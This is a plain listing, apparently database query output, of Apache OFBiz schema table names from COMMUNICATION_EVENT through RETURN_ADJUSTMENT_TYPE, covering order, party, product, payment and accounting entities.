OFBIZ               |COMMUNICATION_EVENT           |
OFBIZ               |COMMUNICATION_EVENT_ORDER     |
OFBIZ               |COMMUNICATION_EVENT_PRODUCT   |
OFBIZ               |COMMUNICATION_EVENT_PRP_TYP   |
OFBIZ               |COMMUNICATION_EVENT_PURPOSE   |
OFBIZ               |COMMUNICATION_EVENT_RETURN    |
OFBIZ               |COMMUNICATION_EVENT_ROLE      |
OFBIZ               |COMMUNICATION_EVENT_TYPE      |
OFBIZ               |COMMUNICATION_EVENT_WORK_EFF  |
OFBIZ               |COMM_CONTENT_ASSOC_TYPE       |
OFBIZ               |COMM_EVENT_CONTENT_ASSOC      |
OFBIZ               |CONFIG_OPTION_PRODUCT_OPTION  |
OFBIZ               |CONTACT_LIST                  |
OFBIZ               |CONTACT_LIST_COMM_STATUS      |
OFBIZ               |CONTACT_LIST_PARTY            |
OFBIZ               |CONTACT_LIST_PARTY_STATUS     |
OFBIZ               |CONTACT_LIST_TYPE             |
OFBIZ               |CONTACT_MECH                  |
OFBIZ               |CONTACT_MECH_ATTRIBUTE        |
OFBIZ               |CONTACT_MECH_LINK             |
OFBIZ               |CONTACT_MECH_PURPOSE_TYPE     |
OFBIZ               |CONTACT_MECH_TYPE             |
OFBIZ               |CONTACT_MECH_TYPE_ATTR        |
OFBIZ               |CONTACT_MECH_TYPE_PURPOSE     |
OFBIZ               |CONTAINER                     |
OFBIZ               |CONTAINER_GEO_POINT           |
OFBIZ               |CONTAINER_TYPE                |
OFBIZ               |CONTENT                       |
OFBIZ               |CONTENT_APPROVAL              |
OFBIZ               |CONTENT_ASSOC                 |
OFBIZ               |CONTENT_ASSOC_PREDICATE       |
OFBIZ               |CONTENT_ASSOC_TYPE            |
OFBIZ               |CONTENT_ATTRIBUTE             |
OFBIZ               |CONTENT_KEYWORD               |
OFBIZ               |CONTENT_META_DATA             |
OFBIZ               |CONTENT_OPERATION             |
OFBIZ               |CONTENT_PURPOSE               |
OFBIZ               |CONTENT_PURPOSE_OPERATION     |
OFBIZ               |CONTENT_PURPOSE_TYPE          |
OFBIZ               |CONTENT_REVISION              |
OFBIZ               |CONTENT_REVISION_ITEM         |
OFBIZ               |CONTENT_ROLE                  |
OFBIZ               |CONTENT_SEARCH_CONSTRAINT     |
OFBIZ               |CONTENT_SEARCH_RESULT         |
OFBIZ               |CONTENT_TYPE                  |
OFBIZ               |CONTENT_TYPE_ATTR             |
OFBIZ               |COST_COMPONENT                |
OFBIZ               |COST_COMPONENT_ATTRIBUTE      |
OFBIZ               |COST_COMPONENT_CALC           |
OFBIZ               |COST_COMPONENT_TYPE           |
OFBIZ               |COST_COMPONENT_TYPE_ATTR      |
OFBIZ               |COUNTRY_ADDRESS_FORMAT        |
OFBIZ               |COUNTRY_CAPITAL               |
OFBIZ               |COUNTRY_CODE                  |
OFBIZ               |COUNTRY_TELE_CODE             |
OFBIZ               |CREDIT_CARD                   |
OFBIZ               |CREDIT_CARD_TYPE_GL_ACCOUNT   |
OFBIZ               |CUSTOM_METHOD                 |
OFBIZ               |CUSTOM_METHOD_TYPE            |
OFBIZ               |CUSTOM_SCREEN                 |
OFBIZ               |CUSTOM_SCREEN_TYPE            |
OFBIZ               |CUSTOM_TIME_PERIOD            |
OFBIZ               |CUST_REQUEST                  |
OFBIZ               |CUST_REQUEST_ATTRIBUTE        |
OFBIZ               |CUST_REQUEST_CATEGORY         |
OFBIZ               |CUST_REQUEST_COMM_EVENT       |
OFBIZ               |CUST_REQUEST_CONTENT          |
OFBIZ               |CUST_REQUEST_ITEM             |
OFBIZ               |CUST_REQUEST_ITEM_NOTE        |
OFBIZ               |CUST_REQUEST_ITEM_WORK_EFFORT |
OFBIZ               |CUST_REQUEST_NOTE             |
OFBIZ               |CUST_REQUEST_PARTY            |
OFBIZ               |CUST_REQUEST_RESOLUTION       |
OFBIZ               |CUST_REQUEST_STATUS           |
OFBIZ               |CUST_REQUEST_TYPE             |
OFBIZ               |CUST_REQUEST_TYPE_ATTR        |
OFBIZ               |CUST_REQUEST_WORK_EFFORT      |
OFBIZ               |DATA_CATEGORY                 |
OFBIZ               |DATA_RESOURCE                 |
OFBIZ               |DATA_RESOURCE_ATTRIBUTE       |
OFBIZ               |DATA_RESOURCE_META_DATA       |
OFBIZ               |DATA_RESOURCE_PURPOSE         |
OFBIZ               |DATA_RESOURCE_ROLE            |
OFBIZ               |DATA_RESOURCE_TYPE            |
OFBIZ               |DATA_RESOURCE_TYPE_ATTR       |
OFBIZ               |DATA_SOURCE                   |
OFBIZ               |DATA_SOURCE_TYPE              |
OFBIZ               |DATA_TEMPLATE_TYPE            |
OFBIZ               |DEDUCTION                     |
OFBIZ               |DEDUCTION_TYPE                |
OFBIZ               |DELIVERABLE                   |
OFBIZ               |DELIVERABLE_TYPE              |
OFBIZ               |DELIVERY                      |
OFBIZ               |DESIRED_FEATURE               |
OFBIZ               |DOCUMENT                      |
OFBIZ               |DOCUMENT_ATTRIBUTE            |
OFBIZ               |DOCUMENT_TYPE                 |
OFBIZ               |DOCUMENT_TYPE_ATTR            |
OFBIZ               |EBAY_CONFIG                   |
OFBIZ               |EBAY_SHIPPING_METHOD          |
OFBIZ               |EFT_ACCOUNT                   |
OFBIZ               |ELECTRONIC_TEXT               |
OFBIZ               |EMAIL_ADDRESS_VERIFICATION    |
OFBIZ               |EMAIL_TEMPLATE_SETTING        |
OFBIZ               |EMPLOYMENT                    |
OFBIZ               |EMPLOYMENT_APP                |
OFBIZ               |EMPLOYMENT_APP_SOURCE_TYPE    |
OFBIZ               |EMPL_LEAVE                    |
OFBIZ               |EMPL_LEAVE_REASON_TYPE        |
OFBIZ               |EMPL_LEAVE_TYPE               |
OFBIZ               |EMPL_POSITION                 |
OFBIZ               |EMPL_POSITION_CLASS_TYPE      |
OFBIZ               |EMPL_POSITION_FULFILLMENT     |
OFBIZ               |EMPL_POSITION_REPORTING_STRUCT|
OFBIZ               |EMPL_POSITION_RESPONSIBILITY  |
OFBIZ               |EMPL_POSITION_TYPE            |
OFBIZ               |EMPL_POSITION_TYPE_CLASS      |
OFBIZ               |EMPL_POSITION_TYPE_RATE_NEW   |
OFBIZ               |ENTITY_AUDIT_LOG              |
OFBIZ               |ENTITY_GROUP                  |
OFBIZ               |ENTITY_GROUP_ENTRY            |
OFBIZ               |ENTITY_KEY_STORE              |
OFBIZ               |ENTITY_SYNC                   |
OFBIZ               |ENTITY_SYNC_HISTORY           |
OFBIZ               |ENTITY_SYNC_INCLUDE           |
OFBIZ               |ENTITY_SYNC_INCLUDE_GROUP     |
OFBIZ               |ENTITY_SYNC_REMOVE            |
OFBIZ               |ENUMERATION                   |
OFBIZ               |ENUMERATION_TYPE              |
OFBIZ               |EXAMPLE                       |
OFBIZ               |EXAMPLE_FEATURE               |
OFBIZ               |EXAMPLE_FEATURE_APPL          |
OFBIZ               |EXAMPLE_FEATURE_APPL_TYPE     |
OFBIZ               |EXAMPLE_ITEM                  |
OFBIZ               |EXAMPLE_STATUS                |
OFBIZ               |EXAMPLE_TYPE                  |
OFBIZ               |EXCEL_IMPORT_HISTORY          |
OFBIZ               |FACILITY                      |
OFBIZ               |FACILITY_ASSOC_TYPE           |
OFBIZ               |FACILITY_ATTRIBUTE            |
OFBIZ               |FACILITY_CALENDAR             |
OFBIZ               |FACILITY_CALENDAR_TYPE        |
OFBIZ               |FACILITY_CARRIER_SHIPMENT     |
OFBIZ               |FACILITY_CONTACT_MECH         |
OFBIZ               |FACILITY_CONTACT_MECH_PURPOSE |
OFBIZ               |FACILITY_CONTENT              |
OFBIZ               |FACILITY_GROUP                |
OFBIZ               |FACILITY_GROUP_MEMBER         |
OFBIZ               |FACILITY_GROUP_ROLE           |
OFBIZ               |FACILITY_GROUP_ROLLUP         |
OFBIZ               |FACILITY_GROUP_TYPE           |
OFBIZ               |FACILITY_LOCATION             |
OFBIZ               |FACILITY_LOCATION_GEO_POINT   |
OFBIZ               |FACILITY_PARTY                |
OFBIZ               |FACILITY_TYPE                 |
OFBIZ               |FACILITY_TYPE_ATTR            |
OFBIZ               |FILE_EXTENSION                |
OFBIZ               |FIN_ACCOUNT                   |
OFBIZ               |FIN_ACCOUNT_ATTRIBUTE         |
OFBIZ               |FIN_ACCOUNT_AUTH              |
OFBIZ               |FIN_ACCOUNT_ROLE              |
OFBIZ               |FIN_ACCOUNT_STATUS            |
OFBIZ               |FIN_ACCOUNT_TRANS             |
OFBIZ               |FIN_ACCOUNT_TRANS_ATTRIBUTE   |
OFBIZ               |FIN_ACCOUNT_TRANS_TYPE        |
OFBIZ               |FIN_ACCOUNT_TRANS_TYPE_ATTR   |
OFBIZ               |FIN_ACCOUNT_TYPE              |
OFBIZ               |FIN_ACCOUNT_TYPE_ATTR         |
OFBIZ               |FIN_ACCOUNT_TYPE_GL_ACCOUNT   |
OFBIZ               |FIXED_ASSET                   |
OFBIZ               |FIXED_ASSET_ATTRIBUTE         |
OFBIZ               |FIXED_ASSET_DEP_METHOD        |
OFBIZ               |FIXED_ASSET_GEO_POINT         |
OFBIZ               |FIXED_ASSET_IDENT             |
OFBIZ               |FIXED_ASSET_IDENT_TYPE        |
OFBIZ               |FIXED_ASSET_MAINT             |
OFBIZ               |FIXED_ASSET_MAINT_ORDER       |
OFBIZ               |FIXED_ASSET_METER             |
OFBIZ               |FIXED_ASSET_PRODUCT           |
OFBIZ               |FIXED_ASSET_PRODUCT_TYPE      |
OFBIZ               |FIXED_ASSET_REGISTRATION      |
OFBIZ               |FIXED_ASSET_STD_COST          |
OFBIZ               |FIXED_ASSET_STD_COST_TYPE     |
OFBIZ               |FIXED_ASSET_TYPE              |
OFBIZ               |FIXED_ASSET_TYPE_ATTR         |
OFBIZ               |FIXED_ASSET_TYPE_GL_ACCOUNT   |
OFBIZ               |FTP_ADDRESS                   |
OFBIZ               |GEO                           |
OFBIZ               |GEO_ASSOC                     |
OFBIZ               |GEO_ASSOC_TYPE                |
OFBIZ               |GEO_POINT                     |
OFBIZ               |GEO_TYPE                      |
OFBIZ               |GIFT_CARD                     |
OFBIZ               |GIFT_CARD_FULFILLMENT         |
OFBIZ               |GIT_HUB_USER                  |
OFBIZ               |GL_ACCOUNT                    |
OFBIZ               |GL_ACCOUNT_CATEGORY           |
OFBIZ               |GL_ACCOUNT_CATEGORY_MEMBER    |
OFBIZ               |GL_ACCOUNT_CATEGORY_TYPE      |
OFBIZ               |GL_ACCOUNT_CLASS              |
OFBIZ               |GL_ACCOUNT_GROUP              |
OFBIZ               |GL_ACCOUNT_GROUP_MEMBER       |
OFBIZ               |GL_ACCOUNT_GROUP_TYPE         |
OFBIZ               |GL_ACCOUNT_HISTORY            |
OFBIZ               |GL_ACCOUNT_ORGANIZATION       |
OFBIZ               |GL_ACCOUNT_ROLE               |
OFBIZ               |GL_ACCOUNT_TYPE               |
OFBIZ               |GL_ACCOUNT_TYPE_DEFAULT       |
OFBIZ               |GL_BUDGET_XREF                |
OFBIZ               |GL_FISCAL_TYPE                |
OFBIZ               |GL_JOURNAL                    |
OFBIZ               |GL_RECONCILIATION             |
OFBIZ               |GL_RECONCILIATION_ENTRY       |
OFBIZ               |GL_RESOURCE_TYPE              |
OFBIZ               |GL_XBRL_CLASS                 |
OFBIZ               |GOOD_IDENTIFICATION           |
OFBIZ               |GOOD_IDENTIFICATION_TYPE      |
OFBIZ               |IMAGE_DATA_RESOURCE           |
OFBIZ               |INVENTORY_ITEM                |
OFBIZ               |INVENTORY_ITEM_ATTRIBUTE      |
OFBIZ               |INVENTORY_ITEM_DETAIL         |
OFBIZ               |INVENTORY_ITEM_LABEL          |
OFBIZ               |INVENTORY_ITEM_LABEL_APPL     |
OFBIZ               |INVENTORY_ITEM_LABEL_TYPE     |
OFBIZ               |INVENTORY_ITEM_STATUS         |
OFBIZ               |INVENTORY_ITEM_TEMP_RES       |
OFBIZ               |INVENTORY_ITEM_TYPE           |
OFBIZ               |INVENTORY_ITEM_TYPE_ATTR      |
OFBIZ               |INVENTORY_ITEM_VARIANCE       |
OFBIZ               |INVENTORY_TRANSFER            |
OFBIZ               |INVOICE                       |
OFBIZ               |INVOICE_ATTRIBUTE             |
OFBIZ               |INVOICE_CONTACT_MECH          |
OFBIZ               |INVOICE_CONTENT               |
OFBIZ               |INVOICE_CONTENT_TYPE          |
OFBIZ               |INVOICE_ITEM                  |
OFBIZ               |INVOICE_ITEM_ASSOC            |
OFBIZ               |INVOICE_ITEM_ASSOC_TYPE       |
OFBIZ               |INVOICE_ITEM_ATTRIBUTE        |
OFBIZ               |INVOICE_ITEM_TYPE             |
OFBIZ               |INVOICE_ITEM_TYPE_ATTR        |
OFBIZ               |INVOICE_ITEM_TYPE_GL_ACCOUNT  |
OFBIZ               |INVOICE_ITEM_TYPE_MAP         |
OFBIZ               |INVOICE_NOTE                  |
OFBIZ               |INVOICE_ROLE                  |
OFBIZ               |INVOICE_STATUS                |
OFBIZ               |INVOICE_TERM                  |
OFBIZ               |INVOICE_TERM_ATTRIBUTE        |
OFBIZ               |INVOICE_TYPE                  |
OFBIZ               |INVOICE_TYPE_ATTR             |
OFBIZ               |ITEM_ISSUANCE                 |
OFBIZ               |ITEM_ISSUANCE_ROLE            |
OFBIZ               |JAVA_RESOURCE                 |
OFBIZ               |JOB_INTERVIEW                 |
OFBIZ               |JOB_INTERVIEW_TYPE            |
OFBIZ               |JOB_MANAGER_LOCK              |
OFBIZ               |JOB_REQUISITION               |
OFBIZ               |JOB_SANDBOX                   |
OFBIZ               |KEYWORD_THESAURUS             |
OFBIZ               |LINKED_IN_USER                |
OFBIZ               |LOT                           |
OFBIZ               |MARKETING_CAMPAIGN            |
OFBIZ               |MARKETING_CAMPAIGN_NOTE       |
OFBIZ               |MARKETING_CAMPAIGN_PRICE      |
OFBIZ               |MARKETING_CAMPAIGN_PROMO      |
OFBIZ               |MARKETING_CAMPAIGN_ROLE       |
OFBIZ               |MARKET_INTEREST               |
OFBIZ               |META_DATA_PREDICATE           |
OFBIZ               |MIME_TYPE                     |
OFBIZ               |MIME_TYPE_HTML_TEMPLATE       |
OFBIZ               |MRP_EVENT                     |
OFBIZ               |MRP_EVENT_TYPE                |
OFBIZ               |NEED_TYPE                     |
OFBIZ               |NOTE_DATA                     |
OFBIZ               |ORDER_ADJUSTMENT              |
OFBIZ               |ORDER_ADJUSTMENT_ATTRIBUTE    |
OFBIZ               |ORDER_ADJUSTMENT_BILLING      |
OFBIZ               |ORDER_ADJUSTMENT_TYPE         |
OFBIZ               |ORDER_ADJUSTMENT_TYPE_ATTR    |
OFBIZ               |ORDER_ATTRIBUTE               |
OFBIZ               |ORDER_BLACKLIST               |
OFBIZ               |ORDER_BLACKLIST_TYPE          |
OFBIZ               |ORDER_CONTACT_MECH            |
OFBIZ               |ORDER_CONTENT                 |
OFBIZ               |ORDER_CONTENT_TYPE            |
OFBIZ               |ORDER_DELIVERY_SCHEDULE       |
OFBIZ               |ORDER_HEADER                  |
OFBIZ               |ORDER_HEADER_NOTE             |
OFBIZ               |ORDER_HEADER_WORK_EFFORT      |
OFBIZ               |ORDER_ITEM                    |
OFBIZ               |ORDER_ITEM_ASSOC              |
OFBIZ               |ORDER_ITEM_ASSOC_TYPE         |
OFBIZ               |ORDER_ITEM_ATTRIBUTE          |
OFBIZ               |ORDER_ITEM_BILLING            |
OFBIZ               |ORDER_ITEM_CHANGE             |
OFBIZ               |ORDER_ITEM_CONTACT_MECH       |
OFBIZ               |ORDER_ITEM_GROUP              |
OFBIZ               |ORDER_ITEM_GROUP_ORDER        |
OFBIZ               |ORDER_ITEM_PRICE_INFO         |
OFBIZ               |ORDER_ITEM_ROLE               |
OFBIZ               |ORDER_ITEM_SHIP_GROUP         |
OFBIZ               |ORDER_ITEM_SHIP_GROUP_ASSOC   |
OFBIZ               |ORDER_ITEM_SHIP_GRP_INV_RES   |
OFBIZ               |ORDER_ITEM_TYPE               |
OFBIZ               |ORDER_ITEM_TYPE_ATTR          |
OFBIZ               |ORDER_NOTIFICATION            |
OFBIZ               |ORDER_PAYMENT_PREFERENCE      |
OFBIZ               |ORDER_PRODUCT_PROMO_CODE      |
OFBIZ               |ORDER_REQUIREMENT_COMMITMENT  |
OFBIZ               |ORDER_ROLE                    |
OFBIZ               |ORDER_SHIPMENT                |
OFBIZ               |ORDER_STATUS                  |
OFBIZ               |ORDER_SUMMARY_ENTRY           |
OFBIZ               |ORDER_TERM                    |
OFBIZ               |ORDER_TERM_ATTRIBUTE          |
OFBIZ               |ORDER_TYPE                    |
OFBIZ               |ORDER_TYPE_ATTR               |
OFBIZ               |OTHER_DATA_RESOURCE           |
OFBIZ               |O_AUTH2_GIT_HUB               |
OFBIZ               |O_AUTH2_LINKED_IN             |
OFBIZ               |PARTY                         |
OFBIZ               |PARTY_ACCTG_PREFERENCE        |
OFBIZ               |PARTY_ATTRIBUTE               |
OFBIZ               |PARTY_BENEFIT                 |
OFBIZ               |PARTY_CARRIER_ACCOUNT         |
OFBIZ               |PARTY_CLASSIFICATION          |
OFBIZ               |PARTY_CLASSIFICATION_GROUP    |
OFBIZ               |PARTY_CLASSIFICATION_TYPE     |
OFBIZ               |PARTY_CONTACT_MECH            |
OFBIZ               |PARTY_CONTACT_MECH_PURPOSE    |
OFBIZ               |PARTY_CONTENT                 |
OFBIZ               |PARTY_CONTENT_TYPE            |
OFBIZ               |PARTY_DATA_SOURCE             |
OFBIZ               |PARTY_FIXED_ASSET_ASSIGNMENT  |
OFBIZ               |PARTY_GEO_POINT               |
OFBIZ               |PARTY_GL_ACCOUNT              |
OFBIZ               |PARTY_GROUP                   |
OFBIZ               |PARTY_ICS_AVS_OVERRIDE        |
OFBIZ               |PARTY_IDENTIFICATION          |
OFBIZ               |PARTY_IDENTIFICATION_TYPE     |
OFBIZ               |PARTY_INVITATION              |
OFBIZ               |PARTY_INVITATION_GROUP_ASSOC  |
OFBIZ               |PARTY_INVITATION_ROLE_ASSOC   |
OFBIZ               |PARTY_NAME_HISTORY            |
OFBIZ               |PARTY_NEED                    |
OFBIZ               |PARTY_NOTE                    |
OFBIZ               |PARTY_PREF_DOC_TYPE_TPL       |
OFBIZ               |PARTY_PROFILE_DEFAULT         |
OFBIZ               |PARTY_QUAL                    |
OFBIZ               |PARTY_QUAL_TYPE               |
OFBIZ               |PARTY_RATE_NEW                |
OFBIZ               |PARTY_RELATIONSHIP            |
OFBIZ               |PARTY_RELATIONSHIP_TYPE       |
OFBIZ               |PARTY_RESUME                  |
OFBIZ               |PARTY_ROLE                    |
OFBIZ               |PARTY_SKILL                   |
OFBIZ               |PARTY_STATUS                  |
OFBIZ               |PARTY_TAX_AUTH_INFO           |
OFBIZ               |PARTY_TYPE                    |
OFBIZ               |PARTY_TYPE_ATTR               |
OFBIZ               |PAYMENT                       |
OFBIZ               |PAYMENT_APPLICATION           |
OFBIZ               |PAYMENT_ATTRIBUTE             |
OFBIZ               |PAYMENT_BUDGET_ALLOCATION     |
OFBIZ               |PAYMENT_CONTENT               |
OFBIZ               |PAYMENT_CONTENT_TYPE          |
OFBIZ               |PAYMENT_GATEWAY_AUTHORIZE_NET |
OFBIZ               |PAYMENT_GATEWAY_CLEAR_COMMERCE|
OFBIZ               |PAYMENT_GATEWAY_CONFIG        |
OFBIZ               |PAYMENT_GATEWAY_CONFIG_TYPE   |
OFBIZ               |PAYMENT_GATEWAY_CYBER_SOURCE  |
OFBIZ               |PAYMENT_GATEWAY_EWAY          |
OFBIZ               |PAYMENT_GATEWAY_ORBITAL       |
OFBIZ               |PAYMENT_GATEWAY_PAYFLOW_PRO   |
OFBIZ               |PAYMENT_GATEWAY_PAY_PAL       |
OFBIZ               |PAYMENT_GATEWAY_RESPONSE      |
OFBIZ               |PAYMENT_GATEWAY_RESP_MSG      |
OFBIZ               |PAYMENT_GATEWAY_SAGE_PAY      |
OFBIZ               |PAYMENT_GATEWAY_SECURE_PAY    |
OFBIZ               |PAYMENT_GATEWAY_WORLD_PAY     |
OFBIZ               |PAYMENT_GL_ACCOUNT_TYPE_MAP   |
OFBIZ               |PAYMENT_GROUP                 |
OFBIZ               |PAYMENT_GROUP_MEMBER          |
OFBIZ               |PAYMENT_GROUP_TYPE            |
OFBIZ               |PAYMENT_METHOD                |
OFBIZ               |PAYMENT_METHOD_TYPE           |
OFBIZ               |PAYMENT_METHOD_TYPE_GL_ACCOUNT|
OFBIZ               |PAYMENT_TYPE                  |
OFBIZ               |PAYMENT_TYPE_ATTR             |
OFBIZ               |PAYROLL_PREFERENCE            |
OFBIZ               |PAY_GRADE                     |
OFBIZ               |PAY_HISTORY                   |
OFBIZ               |PAY_PAL_PAYMENT_METHOD        |
OFBIZ               |PERFORMANCE_NOTE              |
OFBIZ               |PERF_RATING_TYPE              |
OFBIZ               |PERF_REVIEW                   |
OFBIZ               |PERF_REVIEW_ITEM              |
OFBIZ               |PERF_REVIEW_ITEM_TYPE         |
OFBIZ               |PERIOD_TYPE                   |
OFBIZ               |PERSON                        |
OFBIZ               |PERSON_TRAINING               |
OFBIZ               |PHYSICAL_INVENTORY            |
OFBIZ               |PICKLIST                      |
OFBIZ               |PICKLIST_BIN                  |
OFBIZ               |PICKLIST_ITEM                 |
OFBIZ               |PICKLIST_ROLE                 |
OFBIZ               |PICKLIST_STATUS_HISTORY       |
OFBIZ               |PLATFORM_TYPE                 |
OFBIZ               |PORTAL_PAGE                   |
OFBIZ               |PORTAL_PAGE_COLUMN            |
OFBIZ               |PORTAL_PAGE_PORTLET           |
OFBIZ               |PORTAL_PORTLET                |
OFBIZ               |PORTLET_ATTRIBUTE             |
OFBIZ               |PORTLET_CATEGORY              |
OFBIZ               |PORTLET_PORTLET_CATEGORY      |
OFBIZ               |POSTAL_ADDRESS                |
OFBIZ               |POSTAL_ADDRESS_BOUNDARY       |
OFBIZ               |POS_TERMINAL                  |
OFBIZ               |POS_TERMINAL_INTERN_TX        |
OFBIZ               |POS_TERMINAL_LOG              |
OFBIZ               |POS_TERMINAL_STATE            |
OFBIZ               |PRIORITY_TYPE                 |
OFBIZ               |PRODUCT                       |
OFBIZ               |PRODUCT_ASSOC                 |
OFBIZ               |PRODUCT_ASSOC_TYPE            |
OFBIZ               |PRODUCT_ATTRIBUTE             |
OFBIZ               |PRODUCT_AVERAGE_COST          |
OFBIZ               |PRODUCT_AVERAGE_COST_TYPE     |
OFBIZ               |PRODUCT_CALCULATED_INFO       |
OFBIZ               |PRODUCT_CATEGORY              |
OFBIZ               |PRODUCT_CATEGORY_ATTRIBUTE    |
OFBIZ               |PRODUCT_CATEGORY_CONTENT      |
OFBIZ               |PRODUCT_CATEGORY_CONTENT_TYPE |
OFBIZ               |PRODUCT_CATEGORY_GL_ACCOUNT   |
OFBIZ               |PRODUCT_CATEGORY_LINK         |
OFBIZ               |PRODUCT_CATEGORY_MEMBER       |
OFBIZ               |PRODUCT_CATEGORY_ROLE         |
OFBIZ               |PRODUCT_CATEGORY_ROLLUP       |
OFBIZ               |PRODUCT_CATEGORY_TYPE         |
OFBIZ               |PRODUCT_CATEGORY_TYPE_ATTR    |
OFBIZ               |PRODUCT_CONFIG                |
OFBIZ               |PRODUCT_CONFIG_CONFIG         |
OFBIZ               |PRODUCT_CONFIG_ITEM           |
OFBIZ               |PRODUCT_CONFIG_OPTION         |
OFBIZ               |PRODUCT_CONFIG_OPTION_IACTN   |
OFBIZ               |PRODUCT_CONFIG_PRODUCT        |
OFBIZ               |PRODUCT_CONFIG_STATS          |
OFBIZ               |PRODUCT_CONTENT               |
OFBIZ               |PRODUCT_CONTENT_TYPE          |
OFBIZ               |PRODUCT_COST_COMPONENT_CALC   |
OFBIZ               |PRODUCT_FACILITY              |
OFBIZ               |PRODUCT_FACILITY_ASSOC        |
OFBIZ               |PRODUCT_FACILITY_LOCATION     |
OFBIZ               |PRODUCT_FEATURE               |
OFBIZ               |PRODUCT_FEATURE_APPL          |
OFBIZ               |PRODUCT_FEATURE_APPL_ATTR     |
OFBIZ               |PRODUCT_FEATURE_APPL_TYPE     |
OFBIZ               |PRODUCT_FEATURE_CATEGORY      |
OFBIZ               |PRODUCT_FEATURE_CATEGORY_APPL |
OFBIZ               |PRODUCT_FEATURE_CAT_GRP_APPL  |
OFBIZ               |PRODUCT_FEATURE_DATA_RESOURCE |
OFBIZ               |PRODUCT_FEATURE_GROUP         |
OFBIZ               |PRODUCT_FEATURE_GROUP_APPL    |
OFBIZ               |PRODUCT_FEATURE_IACTN         |
OFBIZ               |PRODUCT_FEATURE_IACTN_TYPE    |
OFBIZ               |PRODUCT_FEATURE_PRICE         |
OFBIZ               |PRODUCT_FEATURE_TYPE          |
OFBIZ               |PRODUCT_GEO                   |
OFBIZ               |PRODUCT_GL_ACCOUNT            |
OFBIZ               |PRODUCT_GROUP_ORDER           |
OFBIZ               |PRODUCT_KEYWORD_NEW           |
OFBIZ               |PRODUCT_MAINT                 |
OFBIZ               |PRODUCT_MAINT_TYPE            |
OFBIZ               |PRODUCT_MANUFACTURING_RULE    |
OFBIZ               |PRODUCT_METER                 |
OFBIZ               |PRODUCT_METER_TYPE            |
OFBIZ               |PRODUCT_ORDER_ITEM            |
OFBIZ               |PRODUCT_PAYMENT_METHOD_TYPE   |
OFBIZ               |PRODUCT_PRICE                 |
OFBIZ               |PRODUCT_PRICE_ACTION          |
OFBIZ               |PRODUCT_PRICE_ACTION_TYPE     |
OFBIZ               |PRODUCT_PRICE_AUTO_NOTICE     |
OFBIZ               |PRODUCT_PRICE_CHANGE          |
OFBIZ               |PRODUCT_PRICE_COND            |
OFBIZ               |PRODUCT_PRICE_PURPOSE         |
OFBIZ               |PRODUCT_PRICE_RULE            |
OFBIZ               |PRODUCT_PRICE_TYPE            |
OFBIZ               |PRODUCT_PROMO                 |
OFBIZ               |PRODUCT_PROMO_ACTION          |
OFBIZ               |PRODUCT_PROMO_CATEGORY        |
OFBIZ               |PRODUCT_PROMO_CODE            |
OFBIZ               |PRODUCT_PROMO_CODE_EMAIL      |
OFBIZ               |PRODUCT_PROMO_CODE_PARTY      |
OFBIZ               |PRODUCT_PROMO_COND            |
OFBIZ               |PRODUCT_PROMO_CONTENT         |
OFBIZ               |PRODUCT_PROMO_PRODUCT         |
OFBIZ               |PRODUCT_PROMO_RULE            |
OFBIZ               |PRODUCT_PROMO_USE             |
OFBIZ               |PRODUCT_REVIEW                |
OFBIZ               |PRODUCT_ROLE                  |
OFBIZ               |PRODUCT_SEARCH_CONSTRAINT     |
OFBIZ               |PRODUCT_SEARCH_RESULT         |
OFBIZ               |PRODUCT_STORE                 |
OFBIZ               |PRODUCT_STORE_CATALOG         |
OFBIZ               |PRODUCT_STORE_EMAIL_SETTING   |
OFBIZ               |PRODUCT_STORE_FACILITY        |
OFBIZ               |PRODUCT_STORE_FIN_ACT_SETTING |
OFBIZ               |PRODUCT_STORE_GROUP           |
OFBIZ               |PRODUCT_STORE_GROUP_MEMBER    |
OFBIZ               |PRODUCT_STORE_GROUP_ROLE      |
OFBIZ               |PRODUCT_STORE_GROUP_ROLLUP    |
OFBIZ               |PRODUCT_STORE_GROUP_TYPE      |
OFBIZ               |PRODUCT_STORE_KEYWORD_OVRD    |
OFBIZ               |PRODUCT_STORE_PAYMENT_SETTING |
OFBIZ               |PRODUCT_STORE_PROMO_APPL      |
OFBIZ               |PRODUCT_STORE_ROLE            |
OFBIZ               |PRODUCT_STORE_SHIPMENT_METH   |
OFBIZ               |PRODUCT_STORE_SURVEY_APPL     |
OFBIZ               |PRODUCT_STORE_VENDOR_PAYMENT  |
OFBIZ               |PRODUCT_STORE_VENDOR_SHIPMENT |
OFBIZ               |PRODUCT_SUBSCRIPTION_RESOURCE |
OFBIZ               |PRODUCT_TYPE                  |
OFBIZ               |PRODUCT_TYPE_ATTR             |
OFBIZ               |PROD_CATALOG                  |
OFBIZ               |PROD_CATALOG_CATEGORY         |
OFBIZ               |PROD_CATALOG_CATEGORY_TYPE    |
OFBIZ               |PROD_CATALOG_INV_FACILITY     |
OFBIZ               |PROD_CATALOG_ROLE             |
OFBIZ               |PROD_CONF_ITEM_CONTENT        |
OFBIZ               |PROD_CONF_ITEM_CONTENT_TYPE   |
OFBIZ               |PROTECTED_VIEW                |
OFBIZ               |PROTOCOL_TYPE                 |
OFBIZ               |QUANTITY_BREAK                |
OFBIZ               |QUANTITY_BREAK_TYPE           |
OFBIZ               |QUOTE                         |
OFBIZ               |QUOTE_ADJUSTMENT              |
OFBIZ               |QUOTE_ATTRIBUTE               |
OFBIZ               |QUOTE_COEFFICIENT             |
OFBIZ               |QUOTE_ITEM                    |
OFBIZ               |QUOTE_NOTE                    |
OFBIZ               |QUOTE_ROLE                    |
OFBIZ               |QUOTE_TERM                    |
OFBIZ               |QUOTE_TERM_ATTRIBUTE          |
OFBIZ               |QUOTE_TYPE                    |
OFBIZ               |QUOTE_TYPE_ATTR               |
OFBIZ               |QUOTE_WORK_EFFORT             |
OFBIZ               |RATE_AMOUNT                   |
OFBIZ               |RATE_TYPE                     |
OFBIZ               |RECURRENCE_INFO               |
OFBIZ               |RECURRENCE_RULE               |
OFBIZ               |REJECTION_REASON              |
OFBIZ               |REORDER_GUIDELINE             |
OFBIZ               |REQUIREMENT                   |
OFBIZ               |REQUIREMENT_ATTRIBUTE         |
OFBIZ               |REQUIREMENT_BUDGET_ALLOCATION |
OFBIZ               |REQUIREMENT_CUST_REQUEST      |
OFBIZ               |REQUIREMENT_ROLE              |
OFBIZ               |REQUIREMENT_STATUS            |
OFBIZ               |REQUIREMENT_TYPE              |
OFBIZ               |REQUIREMENT_TYPE_ATTR         |
OFBIZ               |RESPONDING_PARTY              |
OFBIZ               |RESPONSIBILITY_TYPE           |
OFBIZ               |RETURN_ADJUSTMENT             |
OFBIZ               |RETURN_ADJUSTMENT_TYPE        |
